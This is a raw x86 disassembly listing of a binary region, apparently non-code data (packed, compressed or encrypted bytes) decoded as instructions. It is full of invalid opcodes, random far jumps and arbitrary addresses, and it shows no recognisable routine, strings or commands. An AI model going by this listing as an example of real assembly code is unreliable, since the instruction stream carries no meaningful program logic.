  41bce4:	bound  edx,QWORD PTR [esi+0x51746bf6]
  41bcea:	or     dh,bl
  41bcec:	and    al,0x12
  41bcee:	pop    es
  41bcef:	sub    eax,0x6c21308b
  41bcf4:	fnstsw WORD PTR [esi+0x332d31e2]
  41bcfa:	into   
  41bcfb:	retf   
  41bcfc:	cmp    dl,BYTE PTR [eax+0x17f63f60]
  41bd02:	imul   edx,DWORD PTR [ecx],0xffffffe7
  41bd05:	cmp    cl,BYTE PTR [edx]
  41bd07:	mov    dl,0x5d
  41bd09:	scas   eax,DWORD PTR es:[edi]
  41bd0a:	mov    esi,eax
  41bd0c:	(bad)  
  41bd0d:	fld    TBYTE PTR ds:0x3a38b6ec
  41bd13:	fs cmp eax,0xc57272c9
  41bd19:	aas    
  41bd1a:	push   edi
  41bd1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd1c:	dec    esp
  41bd1d:	nop
  41bd1e:	pop    eax
  41bd1f:	jl     0x41bd41
  41bd21:	mov    dh,BYTE PTR [ecx+0x79]
  41bd24:	jns    0x41bd0d
  41bd26:	dec    edx
  41bd27:	aad    0xde
  41bd29:	sahf   
  41bd2a:	shl    DWORD PTR [eax+edi*8+0x10],0x4c
  41bd2f:	stc    
  41bd30:	push   ebx
  41bd31:	pavgb  mm1,QWORD PTR [edx-0x49]
  41bd35:	nop
  41bd36:	mov    esi,0xad90700c
  41bd3b:	cmp    al,0x1b
  41bd3d:	mov    al,ds:0x8c4225a5
  41bd42:	cmp    ebx,ebx
  41bd44:	mov    ebx,0x19be9931
  41bd49:	jae    0x41bdc2
  41bd4b:	ss add ecx,ebp
  41bd4e:	sar    edi,1
  41bd50:	repz adc al,0x7c
  41bd53:	sub    ebx,DWORD PTR [esi+0x3ac4b445]
  41bd59:	mov    ds:0x662df677,eax
  41bd5e:	lods   al,BYTE PTR ds:[esi]
  41bd5f:	pop    ds
  41bd60:	sbb    DWORD PTR [ebx-0x6a],0xadf5aa5c
  41bd67:	jbe    0x41bdaa
  41bd69:	mov    ds:0xf7c6e81e,eax
  41bd6e:	mov    ?,WORD PTR [esi+0x4e14c050]
  41bd74:	push   edx
  41bd75:	std    
  41bd76:	retf   
  41bd77:	jbe    0x41bd72
  41bd79:	inc    ebx
  41bd7a:	aad    0xe6
  41bd7c:	dec    ebx
  41bd7d:	jb     0x41bd5f
  41bd7f:	dec    edi
  41bd80:	sti    
  41bd81:	dec    eax
  41bd82:	mov    BYTE PTR [esi],dh
  41bd84:	ins    BYTE PTR es:[edi],dx
  41bd85:	rep outs dx,DWORD PTR ds:[esi]
  41bd87:	push   ss
  41bd88:	in     eax,dx
  41bd89:	and    cl,BYTE PTR [eax-0x6733c5ee]
  41bd8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd90:	mov    ah,0x14
  41bd92:	inc    ebp
  41bd93:	dec    esi
  41bd94:	mov    dh,0x41
  41bd96:	cli    
  41bd97:	cdq    
  41bd98:	add    BYTE PTR [ebx],ch
  41bd9a:	inc    edi
  41bd9b:	(bad)  
  41bd9c:	jmp    0x5c68e10b
  41bda1:	stos   DWORD PTR es:[edi],eax
  41bda2:	ror    BYTE PTR [eax-0x4727ccbf],0x12
  41bda9:	adc    BYTE PTR [ebx-0x381ba180],bl
  41bdaf:	inc    ecx
  41bdb0:	dec    ebp
  41bdb1:	rcr    BYTE PTR [esi-0x1],1
  41bdb4:	lods   eax,DWORD PTR ds:[esi]
	...
  41be15:	add    BYTE PTR [ebp-0x63956373],al
  41be1b:	jnp    0x41be14
  41be1d:	out    dx,eax
  41be1e:	add    BYTE PTR [ebp-0x32],dh
  41be21:	push   edx
  41be22:	stos   DWORD PTR es:[edi],eax
  41be23:	clc    
  41be24:	mov    ds:0x126402f,al
  41be29:	add    BYTE PTR [edi],al
  41be2b:	add    DWORD PTR [eax],eax
  41be2d:	add    BYTE PTR ds:0xfc1b82a2,dh
  41be33:	arpl   si,si
  41be35:	hlt    
  41be36:	mov    DWORD PTR [esp+edi*2+0x2d],eax
  41be3a:	mov    al,ds:0xf1562650
  41be3f:	xlat   BYTE PTR ds:[ebx]
  41be40:	mov    dl,0x10
  41be42:	in     al,dx
  41be43:	pop    edx
  41be44:	(bad)  
  41be45:	imul   ebx,DWORD PTR [edx+0x8],0xffffffe9
  41be49:	dec    edi
  41be4a:	and    DWORD PTR ds:0xf230b416,esp
  41be50:	inc    esp
  41be51:	add    al,0x15
  41be53:	idiv   DWORD PTR [ebx+0x53111519]
  41be59:	mov    esi,0x359648ff
  41be5e:	sub    DWORD PTR [edx+0x8],esi
  41be61:	mov    bh,0x4f
  41be63:	jbe    0x41be01
  41be65:	shr    BYTE PTR ds:0xcea58b5,cl
  41be6b:	mov    cl,0x2b
  41be6d:	mov    ch,0xd3
  41be6f:	dec    edi
  41be70:	mov    ecx,0x97768c48
  41be75:	test   BYTE PTR [edx+0x3e],ah
  41be78:	inc    ecx
  41be79:	fistp  QWORD PTR [ecx]
  41be7b:	inc    ebp
  41be7c:	mov    bl,0x6d
  41be7e:	sbb    DWORD PTR [eax],ebp
  41be80:	jbe    0x41bef0
  41be82:	jo     0x41be84
  41be84:	ss pop ebp
  41be86:	inc    ebp
  41be87:	jo     0x41bed5
  41be89:	scas   eax,DWORD PTR es:[edi]
  41be8a:	xor    eax,0x4bc2b46b
  41be8f:	shl    BYTE PTR [esi+0x5f],0xa9
  41be93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be94:	fisubr DWORD PTR [esp+eax*8-0x33a428c5]
  41be9b:	sbb    al,0xa3
  41be9d:	dec    BYTE PTR [eax+0x4785797f]
  41bea3:	jmp    0xba3aaa1c
  41bea8:	xchg   ebp,eax
  41bea9:	xchg   eax,esp
  41beab:	xor    DWORD PTR [ecx+eax*4],ecx
  41beae:	lods   al,BYTE PTR ds:[esi]
  41beaf:	inc    edi
  41beb0:	jle    0x41be65
  41beb2:	sub    al,0x83
  41beb4:	xchg   esi,eax
  41beb5:	js     0x41bee5
  41beb7:	and    ebp,DWORD PTR [esi]
  41beb9:	aad    0x91
  41bebb:	out    0x36,al
  41bebd:	xor    esp,DWORD PTR [ecx+0x6ae778c]
  41bec3:	retf   
  41bec4:	inc    edi
  41bec5:	mov    DWORD PTR [edi],ebp
  41bec7:	out    0xfa,al
  41bec9:	pop    ecx
  41beca:	gs daa 
  41becc:	data16 repnz mov BYTE PTR [ecx+0x61],dh
  41bed1:	aam    0xa1
  41bed3:	cmp    esi,esp
  41bed5:	outs   dx,DWORD PTR ds:[esi]
  41bed6:	mov    ds:0x922b740,eax
  41bedb:	cli    
  41bedc:	push   esp
  41bedd:	dec    edi
  41bede:	cmp    DWORD PTR [eax],edi
  41bee0:	mov    ebx,0xb7a08fc5
  41bee5:	push   esp
  41bee6:	jnp    0x41be7f
  41bee8:	mov    BYTE PTR [eax],dl
  41beea:	cdq    
  41beeb:	sub    BYTE PTR [ecx+0x42],bh
  41beee:	push   esp
  41beef:	pop    esp
  41bef0:	sbb    bh,dl
  41bef2:	stos   DWORD PTR es:[edi],eax
  41bef3:	js     0x41beb5
  41bef5:	dec    esp
  41bef6:	stos   BYTE PTR es:[edi],al
  41bef7:	lahf   
  41bef8:	xchg   ebx,eax
  41bef9:	cmp    DWORD PTR [esi],edx
  41befb:	cld    
  41befc:	fiadd  DWORD PTR [edx+ebx*2]
  41beff:	jns    0x41bf18
  41bf01:	addr16 clc 
  41bf03:	sbb    cl,BYTE PTR [ebx+0xe46134c]
  41bf09:	push   eax
  41bf0a:	fmul   DWORD PTR [ebx+0x37]
  41bf0d:	ins    DWORD PTR es:[edi],dx
  41bf0e:	mov    WORD PTR [edi+0x17],gs
  41bf11:	inc    ebx
  41bf12:	int    0xdd
  41bf14:	inc    edi
  41bf15:	in     eax,dx
  41bf16:	in     eax,0xa
  41bf18:	in     al,dx
  41bf19:	push   edx
  41bf1a:	mov    dl,0xc1
  41bf1c:	mov    edx,DWORD PTR [esi+edi*2]
  41bf1f:	rcr    BYTE PTR [ecx],1
  41bf21:	xor    edi,DWORD PTR [ecx+0x3d]
  41bf24:	enter  0x48a5,0x7e
  41bf28:	stc    
  41bf29:	jb     0x41bee5
  41bf2b:	sbb    bh,BYTE PTR [ebx+ebp*8]
  41bf2e:	popf   
  41bf2f:	adc    DWORD PTR [esi],0xd6d12fab
	...
  41bf95:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41bf99:	es aaa 
  41bf9b:	data16 jne 0x41c011
  41bf9e:	pop    ds
  41bf9f:	sub    DWORD PTR [ebx],ebp
  41bfa1:	daa    
  41bfa2:	fadd   DWORD PTR ds:0x27476b19
  41bfa8:	add    DWORD PTR [eax],eax
  41bfaa:	pop    es
  41bfab:	add    DWORD PTR [eax],eax
  41bfad:	add    bh,al
  41bfaf:	aaa    
  41bfb0:	mov    eax,ds:0xf4729bae
  41bfb5:	les    ebp,FWORD PTR [edx]
  41bfb7:	jmp    0x62be8eb2
  41bfbc:	add    dh,BYTE PTR [ebp-0x7f]
  41bfbf:	stc    
  41bfc0:	xor    ch,al
  41bfc2:	les    esp,FWORD PTR [edx-0x59]
  41bfc5:	jae    0x41bfa3
  41bfc7:	rcl    eax,1
  41bfc9:	repz in eax,0xfb
  41bfcc:	ss push ss
  41bfce:	or     DWORD PTR [edx*1-0x1ffffeb3],eax
  41bfd5:	and    al,BYTE PTR ds:0xca25eeb2
  41bfdb:	xchg   ecx,eax
  41bfdc:	sbb    dh,BYTE PTR [ebx+0x118e4e93]
  41bfe2:	or     eax,0x538a3497
  41bfe7:	add    edx,DWORD PTR [esi]
  41bfe9:	push   esp
  41bfea:	iret   
  41bfeb:	mov    bl,0xf
  41bfed:	dec    edx
  41bfee:	ret    0x8634
  41bff1:	mov    BYTE PTR [ecx],bl
  41bff3:	push   ebp
  41bff4:	aam    0xd1
  41bff6:	pop    edx
  41bff7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bff8:	cmp    ah,al
  41bffa:	cli    
  41bffb:	ror    DWORD PTR [ebx+0x22d64e8d],0x74
  41c002:	test   eax,0x5c6f91ce
  41c007:	pop    esi
  41c008:	push   0x115d96b3
  41c00d:	mov    ds:0xb818c445,al
  41c012:	push   ss
  41c013:	inc    ebx
  41c014:	sbb    ebp,DWORD PTR [edi-0x2569e410]
  41c01a:	(bad)  
  41c01b:	pop    ebp
  41c01c:	icebp  
  41c01d:	sbb    esi,0x1e
  41c020:	inc    eax
  41c021:	mov    cl,0x78
  41c023:	mov    gs,WORD PTR [esi]
  41c025:	(bad)  
  41c026:	pop    ebp
  41c027:	aas    
  41c028:	add    dl,bl
  41c02a:	cmp    DWORD PTR ds:0x4b745ac7,esp
  41c030:	push   esp
  41c031:	imul   ecx,DWORD PTR [ebx-0x7c300aa5],0x779dd4ed
  41c03b:	lock sub DWORD PTR [edi+0x4096e402],ecx
  41c042:	test   eax,0x42dcadc2
  41c047:	dec    ebx
  41c048:	mov    eax,0xb8014d6b
  41c04d:	dec    edx
  41c04e:	jo     0x41c0cd
  41c050:	popf   
  41c051:	aam    0xe7
  41c053:	in     al,0x4e
  41c055:	daa    
  41c056:	add    BYTE PTR [edx+0x8e4c3f1],dl
  41c05c:	jge    0x41c032
  41c05e:	aaa    
  41c05f:	adc    al,0x60
  41c061:	in     al,0x33
  41c063:	les    edi,FWORD PTR [edi+edx*8]
  41c066:	popf   
  41c067:	inc    ebx
  41c068:	mov    esp,0x6bacec26
  41c06d:	loope  0x41c0c1
  41c06f:	int3   
  41c070:	daa    
  41c071:	lods   eax,DWORD PTR ds:[esi]
  41c072:	leave  
  41c073:	cld    
  41c074:	mov    ds:0x5bb220d3,eax
  41c079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c07a:	lahf   
  41c07b:	sti    
  41c07c:	jecxz  0x41c091
  41c07e:	outs   dx,BYTE PTR ds:[esi]
  41c07f:	movhps QWORD PTR [ecx+0x67],xmm7
  41c083:	adc    edx,edi
  41c085:	(bad)  
  41c086:	shl    DWORD PTR [edx],cl
  41c088:	inc    edi
  41c089:	(bad)  
  41c08a:	in     eax,dx
  41c08b:	mov    DWORD PTR [edx-0x73b30f5],ebp
  41c091:	fnstenv [edi+0x71]
  41c094:	jns    0x41c0cd
  41c096:	cli    
  41c097:	mov    ds:0xf608c04f,eax
  41c09c:	jge    0x41c036
  41c09e:	gs jnp 0x41c079
  41c0a1:	fmul   DWORD PTR [ecx+0x4b]
  41c0a4:	aaa    
  41c0a5:	push   ebp
  41c0a6:	cmp    eax,0xa0a4ac4f
  41c0ab:	pop    edi
  41c0ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0ad:	iret   
  41c0ae:	add    BYTE PTR [edx],ah
  41c0b0:	mov    ah,0xa5
  41c0b2:	hlt    
  41c0b3:	mov    al,0xfe
	...
  41c115:	add    cl,bl
  41c117:	dec    edx
  41c118:	mov    eax,ds:0xd9fbb3f8
  41c11d:	imul   ecx,DWORD PTR [ecx-0x29],0xffffffbd
  41c121:	clc    
  41c122:	test   eax,0x4efc4252
  41c127:	sub    BYTE PTR [ecx],al
  41c129:	add    BYTE PTR [edi],al
  41c12b:	add    DWORD PTR [eax],eax
  41c12d:	add    BYTE PTR [ecx+eiz*4+0x73d2a02b],dh
  41c134:	jmp    DWORD PTR [eax+0x4a]
  41c137:	lods   eax,DWORD PTR ds:[esi]
  41c138:	jecxz  0x41c0c5
  41c13a:	pop    es
  41c13b:	jecxz  0x41c0ff
  41c13d:	xchg   DWORD PTR [edx-0x6a64239],esp
  41c143:	mov    ebx,0x2466a2de
  41c148:	inc    esi
  41c149:	sbb    ah,dl
  41c14b:	jp     0x41c0d0
  41c14d:	jmp    0x9231:0x96733dc2
  41c154:	cmp    DWORD PTR [ecx+esi*2-0x18],esi
  41c158:	adc    eax,0xd2f31afb
  41c15d:	xchg   esp,eax
  41c15e:	ds mov bh,0xe4
  41c161:	ja     0x41c12f
  41c163:	call   0x4423:0xb9f698af
  41c16a:	push   esi
  41c16b:	adc    DWORD PTR [ecx-0x53],ebx
  41c16e:	mov    al,ds:0x27aaf534
  41c173:	cdq    
  41c174:	add    bl,bh
  41c176:	rol    esp,0x57
  41c179:	mov    cl,BYTE PTR [edx-0x32]
  41c17c:	repnz fsub st,st(4)
  41c17f:	jo     0x41c115
  41c181:	retf   
  41c182:	dec    ebp
  41c183:	mov    ecx,0x997ad8f7
  41c188:	loope  0x41c11a
  41c18a:	ficomp DWORD PTR [edx+0x6a]
  41c18d:	mov    edx,0x1c4d9516
  41c192:	cwde   
  41c193:	and    BYTE PTR es:[ebx+0x3b],ch
  41c197:	leave  
  41c198:	imul   ecx,esp,0xca81b443
  41c19e:	cmp    DWORD PTR [edx+0x5a],ecx
  41c1a1:	cmp    DWORD PTR [ecx-0x4e],0x31fa1bce
  41c1a8:	in     eax,dx
  41c1a9:	stos   DWORD PTR es:[edi],eax
  41c1aa:	mov    al,ds:0xf15a1847
  41c1af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1b0:	ficomp WORD PTR [ecx+0x7a715e0a]
  41c1b6:	mov    al,0xc2
  41c1b8:	sbb    edi,ebp
  41c1ba:	ret    0x46b
  41c1bd:	(bad)
  41c1c0:	(bad)  
  41c1c1:	mov    cl,0xa2
  41c1c3:	jp     0x41c1cc
  41c1c5:	cmp    edx,DWORD PTR [ecx]
  41c1c7:	mov    DWORD PTR [eax-0x60],ebp
  41c1ca:	test   bl,ah
  41c1cc:	xchg   DWORD PTR [eax+ecx*4],ecx
  41c1cf:	shl    DWORD PTR [ebp+0x2e],cl
  41c1d2:	adc    eax,0x7effc707
  41c1d7:	jno    0x41c1e9
  41c1d9:	push   ss
  41c1da:	loopne 0x41c21c
  41c1dc:	(bad)  
  41c1dd:	mov    esi,0x172732cc
  41c1e2:	int    0x3e
  41c1e4:	sbb    eax,0x100f681f
  41c1e9:	icebp  
  41c1ea:	(bad)  
  41c1eb:	adc    al,0xd9
  41c1ed:	aaa    
  41c1ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1ef:	or     eax,0x99184650
  41c1f4:	stos   DWORD PTR es:[edi],eax
  41c1f5:	fstp   TBYTE PTR [ebx]
  41c1f7:	jns    0x41c26f
  41c1f9:	xor    DWORD PTR [ebx+0x5fcf87aa],0xab61f207
  41c203:	ins    BYTE PTR es:[edi],dx
  41c204:	dec    esp
  41c205:	adc    esp,edx
  41c207:	js     0x41c251
  41c209:	xchg   ebx,eax
  41c20a:	xor    al,0x6d
  41c20c:	les    esp,FWORD PTR [eax+0x643a1210]
  41c212:	sub    BYTE PTR [esi-0x9],dh
  41c215:	adc    DWORD PTR [esp+ebp*8-0x6a],0xffffffda
  41c21a:	jne    0x41c20f
  41c21c:	mov    dl,0xa8
  41c21e:	je     0x41c1a0
  41c220:	cmp    eax,0xda70090d
  41c225:	imul   edi,DWORD PTR [eax+0x46823325],0x0
  41c22c:	xchg   ebp,eax
  41c22d:	or     edi,ecx
  41c22f:	sbb    eax,0x11065f5a
  41c234:	pushf  
	...
  41c295:	add    bl,dh
  41c297:	and    ebp,ecx
  41c299:	push   ebp
  41c29a:	(bad)  
  41c29c:	sti    
  41c29d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c29e:	push   esp
  41c29f:	mov    WORD PTR [edi+0x3f],?
  41c2a2:	and    eax,0x5562f132
  41c2a7:	sub    DWORD PTR [ecx],eax
  41c2a9:	add    BYTE PTR [edi],al
  41c2ab:	add    DWORD PTR [eax],eax
  41c2ad:	add    BYTE PTR [ecx+0x2f],dl
  41c2b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2b1:	jo     0x41c28f
  41c2b3:	mov    dh,0x1e
  41c2b5:	mov    ebx,DWORD PTR [edi]
  41c2b7:	aas    
  41c2b8:	setg   BYTE PTR [esi-0x7792e452]
  41c2bf:	mov    gs,esi
  41c2c1:	push   edx
  41c2c2:	mov    bl,0xb2
  41c2c4:	fs cmp al,0xd0
  41c2c7:	mov    ds:0xd96e5bc3,eax
  41c2cc:	pop    ebx
  41c2cd:	ss jmp 0xe9496674
  41c2d3:	dec    esp
  41c2d4:	mov    edx,0xbdd413f2
  41c2d9:	push   ebx
  41c2da:	aaa    
  41c2db:	lods   al,BYTE PTR ds:[esi]
  41c2dc:	call   0x2c09:0xda2dae1d
  41c2e3:	cmp    DWORD PTR [eax],ecx
  41c2e5:	enter  0xb884,0x43
  41c2e9:	jo     0x41c296
  41c2eb:	pop    edi
  41c2ec:	sar    BYTE PTR [esi+eax*8],1
  41c2ef:	sub    eax,0xcfe4bccf
  41c2f4:	pop    esp
  41c2f5:	ja     0x41c2ae
  41c2f7:	mov    dl,0xa
  41c2f9:	dec    ebp
  41c2fa:	and    al,0x60
  41c2fc:	xor    eax,0x2d8dba2b
  41c301:	or     eax,0x107eeed3
  41c306:	retf   0xa8b0
  41c309:	lods   al,BYTE PTR cs:[esi]
  41c30b:	or     BYTE PTR [ebp-0x6fd2bb9f],dh
  41c311:	pop    eax
  41c312:	mov    bh,0x2b
  41c314:	stos   DWORD PTR es:[edi],eax
  41c315:	jbe    0x41c2b4
  41c317:	mov    al,ds:0xda540496
  41c31c:	lea    esp,[ecx+0x3a82a8e9]
  41c322:	inc    edi
  41c323:	cmp    al,0x78
  41c325:	jmp    0xbef1cadb
  41c32a:	les    edx,FWORD PTR [esi+0x34]
  41c32d:	retf   
  41c32e:	aad    0x68
  41c330:	sub    esp,DWORD PTR [edi]
  41c332:	xchg   esi,eax
  41c333:	in     al,dx
  41c334:	in     al,dx
  41c335:	es dec edi
  41c337:	xchg   BYTE PTR [ebp+0x6a985332],cl
  41c33d:	dec    eax
  41c33e:	jle    0x41c2f3
  41c340:	std    
  41c341:	xor    cl,BYTE PTR [ebp+esi*1-0x76796565]
  41c348:	jo     0x41c315
  41c34a:	fwait
  41c34b:	add    dl,BYTE PTR [esi+0xe6746e1]
  41c351:	push   ecx
  41c352:	lods   eax,DWORD PTR ds:[esi]
  41c353:	dec    ecx
  41c354:	out    dx,eax
  41c355:	jmp    0x9d5c:0xaba2bc5e
  41c35c:	fild   WORD PTR [ecx]
  41c35e:	(bad)  
  41c35f:	lods   al,BYTE PTR ds:[esi]
  41c360:	sub    eax,0xa1154690
  41c365:	int3   
  41c366:	mov    ch,0xa0
  41c368:	aaa    
  41c369:	sub    eax,0x6d870f77
  41c36e:	daa    
  41c36f:	push   es
  41c370:	push   ss
  41c371:	xchg   edx,eax
  41c372:	call   0x8017:0x6a575719
  41c379:	retf   0x9a39
  41c37c:	out    dx,eax
  41c37d:	(bad)  
  41c37e:	jmp    0xf87f:0x44759152
  41c385:	shl    DWORD PTR [edi+eiz*8],0xdd
  41c389:	jbe    0x41c35d
  41c38b:	(bad)  
  41c38c:	mov    bh,0x49
  41c38e:	jae    0x41c39f
  41c390:	js     0x41c3ad
  41c392:	jmp    0x41c379
  41c394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c395:	inc    edi
  41c396:	call   0xc19d4def
  41c39b:	xchg   esp,eax
  41c39c:	out    0x72,eax
  41c39e:	shr    DWORD PTR cs:0x1eaea81,1
  41c3a5:	jmp    0x74c1:0xd8d8189c
  41c3ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3ae:	add    ecx,DWORD PTR [esi+0x7fee5472]
  41c3b4:	call   0x0:0x0
	...
  41c413:	add    BYTE PTR [eax],al
  41c415:	add    BYTE PTR [ebx+0x20],dl
  41c418:	mov    al,ds:0x5faef3ae
  41c41d:	std    
  41c41e:	mov    ah,0x86
  41c420:	jmp    FWORD PTR [esi+edx*8-0x35]
  41c424:	sar    BYTE PTR [edi+0x12a5c],1
  41c42a:	pop    es
  41c42b:	add    DWORD PTR [eax],eax
  41c42d:	add    BYTE PTR [esp+ecx*4],dh
  41c430:	sub    ch,al
  41c432:	push   cs
  41c433:	ror    BYTE PTR [eax],0xd6
  41c436:	lods   eax,DWORD PTR ds:[esi]
  41c437:	cmp    bh,BYTE PTR [eax-0x7]
  41c43a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c43b:	imul   ebx,DWORD PTR [ecx-0x3b],0xbf6ee942
  41c442:	push   ss
  41c443:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c444:	loope  0x41c3cb
  41c446:	mov    eax,ds:0xcd6d9735
  41c44b:	pop    edi
  41c44d:	cdq    
  41c44e:	dec    ecx
  41c44f:	cld    
  41c450:	and    bl,al
  41c452:	inc    ebx
  41c453:	hlt    
  41c454:	jno    0x41c43e
  41c456:	std    
  41c457:	xchg   BYTE PTR [esi],al
  41c459:	scas   al,BYTE PTR es:[edi]
  41c45a:	mov    al,0x9f
  41c45c:	lods   al,BYTE PTR ds:[esi]
  41c45d:	ins    DWORD PTR es:[edi],dx
  41c45e:	or     DWORD PTR [ecx-0x33],0x732da317
  41c465:	sbb    DWORD PTR [ecx+0x63e23940],0x142b34b2
  41c46f:	lock cmp BYTE PTR [ebp+0x76a44de2],0xf8
  41c477:	push   esp
  41c478:	ins    BYTE PTR es:[edi],dx
  41c479:	push   eax
  41c47a:	int3   
  41c47b:	pop    ds
  41c47c:	rcl    ebx,cl
  41c47e:	adc    dh,dh
  41c480:	push   0xfffffff9
  41c482:	lock in al,dx
  41c484:	retf   0x9030
  41c487:	dec    esi
  41c488:	sub    esi,DWORD PTR [edx]
  41c48a:	xchg   esi,eax
  41c48b:	inc    ecx
  41c48c:	mov    cl,0x96
  41c48e:	enter  0xd9b4,0x2d
  41c492:	mov    bl,cl
  41c494:	inc    ebp
  41c495:	int    0x28
  41c497:	outs   dx,BYTE PTR ds:[esi]
  41c498:	iret   
  41c499:	cld    
  41c49a:	cdq    
  41c49b:	gs push eax
  41c49d:	out    dx,eax
  41c49e:	daa    
  41c49f:	inc    esp
  41c4a0:	jno    0x41c441
  41c4a2:	jne    0x41c4a2
  41c4a4:	jmp    DWORD PTR [edi+esi*1]
  41c4a7:	push   ecx
  41c4a8:	cmp    DWORD PTR [edx-0x47],0x55
  41c4ac:	add    edx,DWORD PTR [edx]
  41c4ae:	sar    ecx,1
  41c4b0:	jns    0x41c447
  41c4b2:	xchg   ecx,eax
  41c4b3:	rol    DWORD PTR [ecx],1
  41c4b5:	rcr    DWORD PTR [edx-0x3d],0x7f
  41c4b9:	sbb    dh,bh
  41c4bb:	retf   
  41c4bc:	jp     0x41c4c5
  41c4be:	ds mov bh,0xfd
  41c4c1:	adc    al,0x31
  41c4c3:	dec    edx
  41c4c4:	nop
  41c4c5:	inc    ecx
  41c4c6:	repnz or ebx,DWORD PTR [eax]
  41c4c9:	loop   0x41c516
  41c4cb:	or     BYTE PTR [ebp-0x2cfe33e3],0xfb
  41c4d2:	idiv   BYTE PTR [edx]
  41c4d4:	retf   0x427e
  41c4d7:	mov    BYTE PTR [eax-0x3b],bl
  41c4da:	sbb    al,0x20
  41c4dc:	pop    esi
  41c4dd:	jno    0x41c532
  41c4df:	inc    esp
  41c4e0:	shl    DWORD PTR [edx],1
  41c4e2:	cmp    ebp,ecx
  41c4e4:	push   cs
  41c4e5:	pop    edx
  41c4e6:	mov    ds:0xaad5bcef,al
  41c4eb:	inc    edi
  41c4ec:	mov    dh,0xc9
  41c4ee:	gs retf 0xb101
  41c4f2:	mov    ebp,0x3b3e7e2e
  41c4f7:	iret   
  41c4f8:	ror    BYTE PTR [edx+0x50703418],1
  41c4fe:	sbb    dl,cl
  41c500:	jmp    0x834e:0x88c65124
  41c507:	inc    ecx
  41c508:	xor    al,0xc6
  41c50a:	pop    esp
  41c50b:	xor    eax,0x8f784592
  41c510:	pop    ds
  41c511:	and    BYTE PTR [edi+edi*1-0x5b],cl
  41c515:	xchg   BYTE PTR [edx+ebx*4-0xd6f6247],ch
  41c51c:	inc    ebx
  41c51d:	retf   
  41c51e:	xchg   BYTE PTR [eax],ch
  41c520:	pop    ds
  41c521:	jo     0x41c54e
  41c523:	aas    
  41c524:	loopne 0x41c4ad
  41c526:	cld    
  41c527:	data16 jbe 0x41c528
  41c52a:	fcmovnu st,st(2)
  41c52c:	push   esp
  41c52d:	mov    WORD PTR [esi+0x1a],?
  41c530:	sahf   
  41c531:	cdq    
  41c532:	jp     0x41c568
  41c534:	dec    edi
	...
  41c595:	add    ch,al
  41c597:	and    edx,DWORD PTR [ecx-0xa4808db]
  41c59d:	jecxz  0x41c5b9
  41c59f:	push   0x10
  41c5a1:	stc    
  41c5a2:	mov    WORD PTR [ebx+0x4b],cs
  41c5a5:	and    ah,BYTE PTR [ebx+0x2b]
  41c5a8:	add    DWORD PTR [eax],eax
  41c5aa:	pop    es
  41c5ab:	add    DWORD PTR [eax],eax
  41c5ad:	add    BYTE PTR ds:0x725d5459,bh
  41c5b3:	out    0xd9,al
  41c5b5:	mov    edi,0xc059e2d6
  41c5ba:	xlat   BYTE PTR ds:[ebx]
  41c5bb:	test   BYTE PTR [edi],0x9e
  41c5be:	ins    DWORD PTR es:[edi],dx
  41c5bf:	and    BYTE PTR [edi+0xbab2d0a],0x46
  41c5c6:	pop    esp
  41c5c7:	cld    
  41c5c8:	popa   
  41c5c9:	icebp  
  41c5ca:	mov    ds:0x5fac5277,al
  41c5cf:	leave  
  41c5d0:	repz jmp 0x41c5da
  41c5d3:	or     edx,DWORD PTR [ecx]
  41c5d5:	loope  0x41c579
  41c5d7:	sub    DWORD PTR [edx-0x72],edx
  41c5da:	xchg   ecx,eax
  41c5db:	es in  al,dx
  41c5dd:	push   cs
  41c5de:	leave  
  41c5df:	xor    BYTE PTR [ecx+edi*1],cl
  41c5e2:	push   ds
  41c5e3:	shr    DWORD PTR [esi+eax*2],cl
  41c5e6:	iret   
  41c5e7:	xchg   esi,eax
  41c5e8:	sbb    al,0x38
  41c5ea:	jge    0x41c63a
  41c5ec:	shr    eax,0x37
  41c5ef:	and    DWORD PTR [ebx+0x5e422bfb],0xfffffff3
  41c5f6:	stc    
  41c5f7:	jp     0x41c632
  41c5f9:	pop    ecx
  41c5fa:	xchg   esp,eax
  41c5fb:	mov    edx,0xb8dd9432
  41c600:	bound  esi,QWORD PTR [ebx+0x22a78d58]
  41c606:	arpl   cx,ax
  41c608:	jl     0x41c67a
  41c60a:	jle    0x41c626
  41c60c:	rol    BYTE PTR [eax+0xd],0x20
  41c610:	mov    cl,0x91
  41c612:	push   cs
  41c613:	cld    
  41c614:	add    esi,DWORD PTR [ebp+0x7b6f7780]
  41c61a:	mov    bh,0x4c
  41c61c:	adc    ecx,esi
  41c61e:	es inc ebx
  41c620:	pusha  
  41c621:	sbb    ebx,edx
  41c623:	inc    edi
  41c624:	in     eax,dx
  41c625:	scas   eax,DWORD PTR es:[edi]
  41c626:	pop    esi
  41c627:	aas    
  41c628:	out    dx,al
  41c629:	xor    dl,BYTE PTR [edx*4-0x4980402]
  41c630:	shl    edx,cl
  41c632:	push   ecx
  41c633:	rcr    DWORD PTR [edi],1
  41c635:	aas    
  41c636:	inc    eax
  41c637:	(bad)  
  41c638:	in     al,dx
  41c639:	cmp    eax,DWORD PTR [ebx-0x8e72f74]
  41c63f:	xchg   DWORD PTR [esi+0x654a673d],ebx
  41c645:	push   DWORD PTR [edi]
  41c647:	push   edx
  41c648:	lods   al,BYTE PTR ds:[esi]
  41c649:	and    bh,BYTE PTR [esi+0x7b209637]
  41c64f:	pop    edi
  41c650:	jl     0x41c648
  41c652:	inc    edx
  41c653:	repz mov ebp,0x10c5fb
  41c659:	into   
  41c65a:	and    DWORD PTR [edi-0x49669c98],ebp
